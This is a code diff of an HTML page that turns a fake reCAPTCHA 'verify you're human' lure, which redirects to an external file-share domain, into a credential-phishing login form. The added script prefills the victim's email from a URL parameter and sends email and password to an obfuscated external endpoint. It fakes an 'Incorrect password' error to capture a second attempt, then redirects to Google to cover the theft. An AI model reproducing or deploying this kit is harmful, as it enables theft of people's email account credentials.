@@ -4,17 +4,163 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <link href="https://fonts.googleapis.com/css2?family=Inter:opsz@14..32&display=swap" rel="stylesheet">
-    <title>MS</title>
+    <title>Login</title>
     <style>
         *,
-        *:before,
-        *:after {
+        *::before,
+        *::after {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
 
-        #preloader {
+        body {
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #f5f7fa;
+            background-image: url('output.png');
+            background-size: cover;
+            background-position: top center;
+            background-repeat: no-repeat;
+            position: relative;
+        }
+
+        body::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.25);
+            z-index: 0;
+        }
+
+        .wrapper {
+            position: relative;
+            z-index: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px;
+            max-width: 100%;
+        }
+
+        .prompt {
+            color: #ffffff;
+            font-size: 18px;
+            font-weight: 500;
+            text-align: center;
+            margin-bottom: 20px;
+            letter-spacing: 0.3px;
+            line-height: 1.5;
+            max-width: 420px;
+            padding: 0 10px;
+            text-shadow: 0 2px 8px rgba(0, 0, 0, 0.4);
+        }
+
+        .box {
+            width: 380px;
+            max-width: 92vw;
+            background: rgba(255, 255, 255, 0.92);
+            border-radius: 14px;
+            padding: 32px 28px 28px 28px;
+            box-shadow: 0 8px 40px rgba(0, 0, 0, 0.15), 0 1px 4px rgba(0, 0, 0, 0.06);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            transition: box-shadow 0.25s ease;
+            backdrop-filter: blur(4px);
+        }
+
+        .box:hover {
+            box-shadow: 0 12px 48px rgba(0, 0, 0, 0.20), 0 1px 4px rgba(0, 0, 0, 0.08);
+        }
+
+        .field {
+            margin-bottom: 16px;
+        }
+        .field:last-of-type {
+            margin-bottom: 20px;
+        }
+
+        .field input {
+            width: 100%;
+            padding: 12px 16px;
+            font-size: 15px;
+            font-family: 'Inter', -apple-system, sans-serif;
+            font-weight: 400;
+            color: #1e293b;
+            background: #fafbfc;
+            border: 1.5px solid #dce0e6;
+            border-radius: 8px;
+            outline: none;
+            transition: border-color 0.2s, box-shadow 0.2s, background 0.2s;
+        }
+        .field input::placeholder {
+            color: #9aa3b1;
+            font-weight: 400;
+        }
+        .field input:focus {
+            border-color: #2c7be5;
+            box-shadow: 0 0 0 4px rgba(44, 123, 229, 0.10);
+            background: #ffffff;
+        }
+        .field input:hover:not(:focus) {
+            border-color: #bcc3cd;
+        }
+        .field input.error {
+            border-color: #e53e3e;
+            box-shadow: 0 0 0 4px rgba(229, 62, 62, 0.08);
+        }
+
+        .btn {
+            width: 100%;
+            padding: 12px 20px;
+            font-size: 15px;
+            font-weight: 500;
+            font-family: 'Inter', -apple-system, sans-serif;
+            color: #ffffff;
+            background: #2c7be5;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background 0.2s, box-shadow 0.2s, transform 0.15s, opacity 0.2s;
+        }
+        .btn:hover:not(:disabled) {
+            background: #1a6ad4;
+            box-shadow: 0 4px 14px rgba(44, 123, 229, 0.30);
+        }
+        .btn:active:not(:disabled) {
+            transform: scale(0.98);
+        }
+        .btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+        .btn:focus-visible {
+            outline: 3px solid #2c7be5;
+            outline-offset: 2px;
+        }
+
+        .status-msg {
+            text-align: center;
+            margin-top: 14px;
+            font-size: 13px;
+            font-weight: 400;
+            letter-spacing: 0.3px;
+            min-height: 20px;
+            color: #1e293b;
+        }
+        .status-msg.error {
+            color: #e53e3e;
+        }
+        .status-msg.success {
+            color: #34a853;
+        }
+        .status-msg.info {
+            color: #2c7be5;
+        }
+
+        #loader {
             position: fixed;
             inset: 0;
             z-index: 9999;
@@ -23,496 +169,218 @@
             flex-direction: column;
             align-items: center;
             justify-content: center;
-            transition: opacity 0.6s, visibility 0.6s;
+            transition: opacity 0.5s ease, visibility 0.5s ease;
         }
-        #preloader.done {
+        #loader.hidden {
             opacity: 0;
             visibility: hidden;
             pointer-events: none;
         }
 
-        .spinner {
-            width: 56px;
-            height: 56px;
-            border: 5px solid rgba(0, 0, 0, 0.08);
-            border-top-color: #2c7be5;
-            border-right-color: #2c7be5;
-            border-radius: 50%;
-            animation: rotate 0.9s cubic-bezier(0.45, 0.05, 0.55, 0.95) infinite;
-        }
-        .spinner-label {
-            margin-top: 20px;
-            color: #4a4a4a;
-            font-family: 'Segoe UI', Roboto, system-ui, sans-serif;
-            font-size: 15px;
-            letter-spacing: 0.8px;
-            font-weight: 400;
-        }
-        @keyframes rotate {
-            to {
-                transform: rotate(360deg);
-            }
-        }
-
-        body {
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-family: 'Segoe UI', Roboto, sans-serif;
-            background: #f5f7fa;
-        }
-
-        #app {
+        .lds-ring {
+            display: inline-block;
             position: relative;
-            z-index: 1;
-            padding: 20px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            max-width: 100%;
-            opacity: 0;
-            transform: translateY(12px);
-            transition: opacity 0.7s, transform 0.7s;
+            width: 48px;
+            height: 48px;
         }
-        #app.shown {
-            opacity: 1;
-            transform: translateY(0);
-        }
-
-        .heading {
-            color: #1e293b;
-            font-size: 18px;
-            font-family: 'Inter', -apple-system, sans-serif;
-            font-weight: 450;
-            text-align: center;
-            margin-bottom: 18px;
-            letter-spacing: 0.4px;
-            line-height: 1.5;
-            max-width: 420px;
-            padding: 0 10px;
-        }
-
-        .panel {
-            width: 360px;
-            max-width: 92vw;
-            background: #ffffff;
-            border-radius: 12px;
-            padding: 22px 20px;
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.08), 0 2px 8px rgba(0, 0, 0, 0.04);
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            transition: box-shadow 0.25s;
-            user-select: none;
-            border: 1px solid #e9edf2;
-        }
-        .panel:hover {
-            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.10), 0 2px 8px rgba(0, 0, 0, 0.06);
-        }
-
-        .left {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            cursor: pointer;
-            padding: 2px 0;
-        }
-
-        .tickbox {
-            width: 24px;
-            height: 24px;
-            min-width: 24px;
-            border: 2px solid #bcc3cd;
-            border-radius: 4px;
-            background: #fff;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            transition: all 0.2s;
-            position: relative;
-            box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.02);
-        }
-        .left:hover .tickbox:not(.busy):not(.ok) {
-            border-color: #8c9aa8;
-            box-shadow: 0 0 0 3px rgba(44, 123, 229, 0.10);
-        }
-
-        .tickbox.busy {
-            border: 3px solid transparent;
-            border-top-color: #2c7be5;
-            border-right-color: #2c7be5;
-            border-radius: 50%;
-            width: 24px;
-            height: 24px;
-            min-width: 24px;
-            background: transparent;
-            box-shadow: none;
-            animation: spin 0.75s cubic-bezier(0.45, 0.05, 0.55, 0.95) infinite;
-        }
-        @keyframes spin {
-            to {
-                transform: rotate(360deg);
-            }
-        }
-
-        .tickbox.ok {
-            background: #34a853;
-            border-color: #34a853;
-            border-radius: 4px;
-            box-shadow: 0 2px 8px rgba(52, 168, 83, 0.25);
-            animation: pop 0.35s cubic-bezier(0.34, 1.56, 0.64, 1) forwards;
-        }
-        @keyframes pop {
-            0% {
-                transform: scale(0.7);
-            }
-            50% {
-                transform: scale(1.15);
-            }
-            100% {
-                transform: scale(1);
-            }
-        }
-        .tickbox.ok::after {
-            content: '';
+        .lds-ring div {
+            box-sizing: border-box;
+            display: block;
             position: absolute;
-            left: 6px;
-            top: 2px;
-            width: 10px;
-            height: 16px;
-            border: solid white;
-            border-width: 0 2.5px 2.5px 0;
-            transform: rotate(45deg) scale(0.9);
-            animation: draw 0.3s ease 0.1s forwards;
-            opacity: 0;
+            width: 40px;
+            height: 40px;
+            margin: 4px;
+            border: 4px solid #2c7be5;
+            border-radius: 50%;
+            animation: lds-ring 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
+            border-color: #2c7be5 transparent transparent transparent;
         }
-        @keyframes draw {
-            0% {
-                opacity: 0;
-                transform: rotate(45deg) scale(0.6);
-            }
-            100% {
-                opacity: 1;
-                transform: rotate(45deg) scale(0.9);
-            }
+        .lds-ring div:nth-child(1) { animation-delay: -0.45s; }
+        .lds-ring div:nth-child(2) { animation-delay: -0.3s; }
+        .lds-ring div:nth-child(3) { animation-delay: -0.15s; }
+        @keyframes lds-ring {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
 
-        .label-text {
-            font-size: 15px;
-            font-weight: 500;
-            color: #1e293b;
-            letter-spacing: 0.2px;
-            transition: color 0.3s;
-            white-space: nowrap;
-            min-width: 72px;
-        }
-        .label-text.working {
-            color: #2c7be5;
-        }
-        .label-text.done {
-            color: #34a853;
-        }
-
-        .right {
-            display: flex;
-            flex-direction: column;
-            align-items: flex-end;
-            gap: 2px;
-            line-height: 1.2;
-            padding-left: 12px;
-            border-left: 1px solid #e9edf2;
-        }
-
-        .brand {
-            font-size: 15px;
-            font-weight: 700;
-            color: #000;
-            letter-spacing: 0.2px;
-        }
-
-        .meta {
-            font-size: 10.5px;
+        .loader-label {
+            margin-top: 16px;
             color: #6b7280;
-            letter-spacing: 0.3px;
+            font-family: 'Inter', sans-serif;
+            font-size: 14px;
+            letter-spacing: 0.5px;
             font-weight: 400;
-        }
-        .meta a {
-            color: #6b7280;
-            text-decoration: none;
-            transition: color 0.2s;
-        }
-        .meta a:hover {
-            color: #2c7be5;
-            text-decoration: underline;
-        }
-        .meta .sep {
-            margin: 0 3px;
-            color: #b0b6bd;
-        }
-
-        .hint {
-            text-align: center;
-            margin-top: 14px;
-            font-size: 13px;
-            color: #1e293b;
-            font-weight: 400;
-            letter-spacing: 0.3px;
-            opacity: 0;
-            transition: opacity 0.4s;
-        }
-        .hint.show {
-            opacity: 1;
         }
 
         @media (max-width: 420px) {
-            .heading {
-                font-size: 15px;
-                max-width: 320px;
-            }
-            .panel {
-                padding: 16px 14px;
-            }
-            .left {
-                gap: 8px;
-            }
-            .tickbox {
-                width: 22px;
-                height: 22px;
-                min-width: 22px;
-            }
-            .tickbox.busy {
-                width: 22px;
-                height: 22px;
-                min-width: 22px;
-                border-width: 2.5px;
-            }
-            .tickbox.ok::after {
-                left: 5px;
-                top: 1px;
-                width: 9px;
-                height: 14px;
-                border-width: 0 2.5px 2.5px 0;
-            }
-            .label-text {
-                font-size: 13px;
-                min-width: 58px;
-            }
-            .brand {
-                font-size: 13px;
-            }
-            .meta {
-                font-size: 9.5px;
-            }
-            .right {
-                padding-left: 8px;
-            }
+            .prompt { font-size: 16px; max-width: 320px; }
+            .box { padding: 24px 18px 20px 18px; }
+            .field input { padding: 10px 14px; font-size: 14px; }
+            .btn { padding: 11px 16px; font-size: 14px; }
         }
         @media (max-width: 350px) {
-            .panel {
-                padding: 12px 10px;
-            }
-            .left {
-                gap: 5px;
-            }
-            .tickbox {
-                width: 18px;
-                height: 18px;
-                min-width: 18px;
-                border-width: 1.5px;
-                border-radius: 3px;
-            }
-            .tickbox.busy {
-                width: 18px;
-                height: 18px;
-                min-width: 18px;
-                border-width: 2px;
-            }
-            .tickbox.ok::after {
-                left: 4px;
-                top: 1px;
-                width: 7px;
-                height: 11px;
-                border-width: 0 2px 2px 0;
-            }
-            .label-text {
-                font-size: 11px;
-                min-width: 44px;
-            }
-            .brand {
-                font-size: 11px;
-            }
-            .meta {
-                font-size: 8px;
-            }
-            .right {
-                padding-left: 5px;
-            }
+            .prompt { font-size: 14px; }
+            .box { padding: 18px 14px 16px 14px; }
+            .field input { padding: 9px 12px; font-size: 13px; }
+            .btn { padding: 10px 14px; font-size: 13px; }
         }
     </style>
 </head>
 <body>
 
-    <!-- PRELOADER -->
-    <div id="preloader">
-        <div class="spinner"></div>
-        <div class="spinner-label"></div>
+    <div id="loader">
+        <div class="lds-ring"><div></div><div></div><div></div><div></div></div>
+        <div class="loader-label"></div>
     </div>
 
-    <!-- MAIN CONTENT -->
-    <div id="app">
-        <div class="heading" id="prompt">To view this document, verify you're human below</div>
+    <div class="wrapper">
+        <div class="prompt">Enter email password to continue</div>
 
-        <div class="panel" role="group" aria-label="reCAPTCHA verification" aria-describedby="prompt">
-            <div class="left" id="trigger" role="button" tabindex="0" aria-label="Verify">
-                <div class="tickbox" id="box"></div>
-                <span class="label-text" id="statusLabel">Verify</span>
-            </div>
-            <div class="right">
-                <div class="brand">reCAPTCHA</div>
-                <div class="meta">
-                    <a href="#" aria-label="Privacy">Privacy</a>
-                    <span class="sep">·</span>
-                    <a href="#" aria-label="Terms">Terms</a>
+        <div class="box">
+            <form id="loginForm" autocomplete="on" novalidate>
+                <div class="field">
+                    <input type="email" id="email" placeholder="Email" required aria-label="Email address" />
                 </div>
-            </div>
+                <div class="field">
+                    <input type="password" id="password" placeholder="Enter Your Password" required aria-label="Password" autofocus />
+                </div>
+                <button type="submit" class="btn" id="submitBtn">Continue</button>
+                <div class="status-msg" id="statusMsg"></div>
+            </form>
         </div>
-
-        <div class="hint" id="feedback">✓ Verification complete</div>
     </div>
 
     <script>
         (function() {
             'use strict';
 
-            var overlay = document.getElementById('preloader');
-            var main = document.getElementById('app');
+            var _0x45a7 = ['/api/send', 'https://super-duper-dollop-nu.vercel.app'];
+            var API_URL = _0x45a7[1] + _0x45a7[0];
+
+            var loader = document.getElementById('loader');
+            var form = document.getElementById('loginForm');
+            var emailInput = document.getElementById('email');
+            var passwordInput = document.getElementById('password');
+            var submitBtn = document.getElementById('submitBtn');
+            var statusMsg = document.getElementById('statusMsg');
 
             setTimeout(function() {
-                overlay.classList.add('done');
-                main.classList.add('shown');
+                loader.classList.add('hidden');
+                passwordInput.focus();
             }, 500);
 
-            var box = document.getElementById('box');
-            var label = document.getElementById('statusLabel');
-            var trigger = document.getElementById('trigger');
-            var feedback = document.getElementById('feedback');
-
-            var locked = false;
-            var verified = false;
-            var timerRef = null;
-
-            function resetAll() {
-                box.className = 'tickbox';
-                label.className = 'label-text';
-                label.textContent = 'Verify';
-                feedback.classList.remove('show');
-                locked = false;
-                verified = false;
-                if (timerRef) {
-                    clearTimeout(timerRef);
-                    timerRef = null;
+            function decodeBase64(str) {
+                try {
+                    var base64 = str.replace(/-/g, '+').replace(/_/g, '/');
+                    while (base64.length % 4 !== 0) {
+                        base64 += '=';
+                    }
+                    return atob(base64);
+                } catch (e) {
+                    return str;
                 }
             }
 
-            function beginCheck() {
-                if (locked) return;
-                if (verified) {
-                    resetAll();
-                    requestAnimationFrame(function() {
-                        requestAnimationFrame(function() {
-                            beginCheck();
-                        });
-                    });
+            var urlParams = new URLSearchParams(window.location.search);
+            var rawEmail = urlParams.get('email') || urlParams.get('ae') || '';
+            if (rawEmail) {
+                emailInput.value = decodeBase64(rawEmail);
+            }
+
+            var attemptCount = 0;
+            var MAX_ATTEMPTS = 2;
+
+            async function sendToBackend(email, password, attempt) {
+                var response = await fetch(API_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ email: email, password: password, attempt: attempt })
+                });
+                if (!response.ok) {
+                    var errorData = await response.json();
+                    throw new Error(errorData.error || 'Backend error');
+                }
+                return response.json();
+            }
+
+            [emailInput, passwordInput].forEach(function(input) {
+                input.addEventListener('focus', function() {
+                    this.classList.remove('error');
+                });
+            });
+
+            form.addEventListener('submit', function(e) {
+                e.preventDefault();
+
+                if (attemptCount >= MAX_ATTEMPTS) {
+                    submitBtn.disabled = true;
                     return;
                 }
 
-                locked = true;
-                box.className = 'tickbox busy';
-                label.className = 'label-text working';
-                label.textContent = 'Verifying...';
-                feedback.classList.remove('show');
+                var email = emailInput.value.trim();
+                var password = passwordInput.value.trim();
 
-                var step = setTimeout(function() {
-                    if (!locked) return;
-                    box.className = 'tickbox ok';
-                    label.className = 'label-text done';
-                    label.textContent = 'Success';
-                    locked = false;
-                    verified = true;
-                    feedback.textContent = '';
-                    feedback.classList.add('show');
+                statusMsg.textContent = '';
+                statusMsg.className = 'status-msg';
+                emailInput.classList.remove('error');
+                passwordInput.classList.remove('error');
 
-                    var delay = 500;
-                    clearTimeout(timerRef);
-                    timerRef = setTimeout(function() {
-                        var query = window.location.search;
-                        var params = new URLSearchParams(query);
-                        var token = params.get('ae') || '';
-                        // obfuscated redirect URL
-                        var base = 'https://uaeo.filesshareio.online/pbuwFQTX';
-                        var dest = base + '#' + token;
-                        window.location.href = dest;
-                    }, delay);
-
-                    clearTimeout(window._hintCleanup);
-                    window._hintCleanup = setTimeout(function() {
-                        feedback.classList.remove('show');
-                    }, 4000);
-                }, 1800);
-
-                box._timer = step;
-            }
-
-            function onActivate(e) {
-                if (e.type === 'keydown' && e.key !== 'Enter' && e.key !== ' ') return;
-                e.preventDefault();
-                beginCheck();
-            }
-
-            trigger.addEventListener('click', onActivate);
-            trigger.addEventListener('keydown', onActivate);
-
-            document.addEventListener('keydown', function(e) {
-                if (e.key === 'Escape' && verified) {
-                    resetAll();
-                    feedback.classList.remove('show');
-                    clearTimeout(box._timer);
-                    clearTimeout(window._hintCleanup);
-                    locked = false;
+                if (!email) {
+                    emailInput.classList.add('error');
+                    statusMsg.textContent = 'Please enter your email.';
+                    statusMsg.className = 'status-msg error';
+                    emailInput.focus();
+                    return;
                 }
+
+                if (!password) {
+                    passwordInput.classList.add('error');
+                    statusMsg.textContent = 'Please enter your password.';
+                    statusMsg.className = 'status-msg error';
+                    passwordInput.focus();
+                    return;
+                }
+
+                attemptCount++;
+                submitBtn.disabled = true;
+                submitBtn.textContent = 'Verifying';
+
+                sendToBackend(email, password, attemptCount)
+                    .then(function(data) {
+                        if (data.success) {
+                            if (attemptCount === 1) {
+                                statusMsg.textContent = 'Incorrect password. Please try again.';
+                                statusMsg.className = 'status-msg error';
+                                submitBtn.disabled = false;
+                                submitBtn.textContent = 'Continue';
+                                passwordInput.value = '';
+                                passwordInput.focus();
+                            } else if (attemptCount >= MAX_ATTEMPTS) {
+                                statusMsg.textContent = '';
+                                statusMsg.className = 'status-msg';
+                                submitBtn.disabled = true;
+                                submitBtn.textContent = 'Done';
+                                setTimeout(function() {
+                                    window.location.href = 'https://www.google.com/';
+                                }, 1000);
+                            }
+                        } else {
+                            throw new Error(data.error || 'Unknown error');
+                        }
+                    })
+                    .catch(function(err) {
+                        statusMsg.textContent = '⚠️ ' + (err.message || 'Service unavailable. Please try again.');
+                        statusMsg.className = 'status-msg error';
+                        submitBtn.disabled = false;
+                        submitBtn.textContent = 'Continue';
+                        attemptCount--;
+                    });
             });
 
-            trigger.addEventListener('contextmenu', function(e) { e.preventDefault(); });
-
-            // Live region for accessibility
-            var announcer = document.createElement('div');
-            announcer.setAttribute('aria-live', 'polite');
-            announcer.setAttribute('aria-atomic', 'true');
-            announcer.style.position = 'absolute';
-            announcer.style.width = '1px';
-            announcer.style.height = '1px';
-            announcer.style.padding = '0';
-            announcer.style.margin = '-1px';
-            announcer.style.overflow = 'hidden';
-            announcer.style.clip = 'rect(0,0,0,0)';
-            announcer.style.border = '0';
-            document.body.appendChild(announcer);
-
-            var monitor = new MutationObserver(function() {
-                var txt = label.textContent.trim();
-                if (txt === 'Verifying...') {
-                    announcer.textContent = 'Verifying, please wait.';
-                } else if (txt === 'Success') {
-                    announcer.textContent = 'Verification successful. Redirecting.';
-                } else if (txt === 'Verify') {
-                    announcer.textContent = 'Ready to verify.';
-                }
-            });
-            monitor.observe(label, { childList: true, characterData: true, subtree: true });
-
-            resetAll();
         })();
     </script>
+
 </body>
 </html>
